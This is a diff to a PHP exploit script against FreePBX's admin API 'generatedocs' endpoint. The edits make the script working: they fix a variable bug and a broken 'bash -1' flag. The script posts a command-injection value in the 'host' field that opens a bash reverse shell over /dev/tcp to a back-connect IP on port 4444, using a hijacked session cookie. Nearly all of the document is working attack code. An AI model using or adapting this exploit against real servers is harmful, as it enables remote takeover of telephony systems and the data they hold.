@@ -4,15 +4,15 @@
 /// Orginal Difcon || https://www.youtube.com/watch?v=rqFJ0BxwlLI
 /// Cod[3]d by Cold z3ro 
 ///
-$url = "remotefreepbx.com";
-$backconnectip = "IP";
+$url = "https://freebpx";
+$backconnectip = "127.0.0.1";
 $port = "4444"; 
-$PHPSESSID = "any valid seesion even extension";
+$PHPSESSID = "ve6bimvtdeg9i3o3spd61cfct4";
 
 	echo "checking $url\n";
-	$url = trim($line);
+	$url = trim($url);
 	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'http://'.$url.'/admin/ajax.php?module=api&command=generatedocs');
+	curl_setopt($ch, CURLOPT_URL, $url.'/admin/ajax.php?module=api&command=generatedocs');
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
@@ -20,11 +20,11 @@ $PHPSESSID = "any valid seesion even extension";
 	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
 	curl_setopt($ch, CURLOPT_TIMEOUT, 2);
 	curl_setopt($ch, CURLOPT_HTTPHEADER, [
-		'Referer: http://'.$url.'/admin/config.php?display=api',
+		'Referer: '.$url.'/admin/config.php?display=api',
 		'Content-Type: application/x-www-form-urlencoded',
 	]);
 	curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID='.$PHPSESSID);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, 'scopes=rest&host=http://'.$backconnectip.'/$(bash -1 >%26 /dev/tcp/'.$backconnectip.'/4444 0>%261)');
+	curl_setopt($ch, CURLOPT_POSTFIELDS, 'scopes=rest&host=http://'.$backconnectip.'/$(/bin/bash -i >& /dev/tcp/'.$backconnectip.'/'.$port.' 0>&1)');
 	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 
